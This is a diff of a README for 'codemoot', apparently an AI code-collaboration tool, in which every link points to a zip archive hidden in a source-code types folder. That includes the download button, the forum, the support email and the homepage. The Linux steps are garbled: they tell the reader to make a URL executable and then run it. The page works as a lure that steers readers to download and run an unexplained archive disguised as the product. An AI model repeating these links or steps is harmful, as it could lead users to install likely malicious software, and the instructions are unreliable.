@@ -1,6 +1,6 @@
 # 🔧 codemoot - Collaborate on Code Using AI Debate
 
-[![Download codemoot](https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip)](https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip)
+[![Download codemoot](https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip)](https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip)
 
 ---
 
@@ -38,12 +38,12 @@ Here is how to prepare your computer for codemoot and open it for the first time
 
 1. **Check your system meets the requirements** above before you proceed.
 2. Go to the download page by clicking the big blue button at the top or visit:  
-   [https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip](https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip)  
+   [https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip](https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip)  
 3. On the releases page, find the latest version of codemoot. It will usually be at the top of the list.
 4. Choose the file that matches your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg` or `.zip`.
-   - For Linux, look for `.AppImage` or `https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip`.
+   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip`.
 5. Click on the file name to download it. Your browser will save it to your computer, usually in the "Downloads" folder.
 
 ---
@@ -67,9 +67,9 @@ Follow these steps after downloading:
 
 ### For Linux Users:
 - Make the downloaded `.AppImage` file executable. In your terminal, type:  
-  `chmod +x https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip`  
+  `chmod +x https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip`  
 - Run the file by double-clicking it or using the command:  
-  `https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip`  
+  `https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip`  
 - Follow any on-screen instructions to complete the installation.
 
 ---
@@ -92,20 +92,20 @@ Once you open codemoot, you will see a simple dashboard that guides you through 
 
 If you get stuck or something is unclear:
 
-- Visit the [codemoot discussion forum](https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip) to ask questions or read past answers.
+- Visit the [codemoot discussion forum](https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip) to ask questions or read past answers.
 - Check out the "Help" section inside the app for tips and tutorials.
-- Email support at: https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip for direct assistance.
+- Email support at: https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip for direct assistance.
 
 ---
 
 ## 🔗 Useful Links
 
 - **Download codemoot:**  
-  [https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip](https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip)
+  [https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip](https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip)
 - **Project Homepage:**  
-  https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip
+  https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip
 - **Support & Discussions:**  
-  https://github.com/Menorah/codemoot/raw/refs/heads/master/packages/core/src/types/Software-v2.5-alpha.5.zip
+  https://raw.githubusercontent.com/Menorah/codemoot/master/packages/core/src/types/Software-v2.5-alpha.5.zip
 
 ---
 
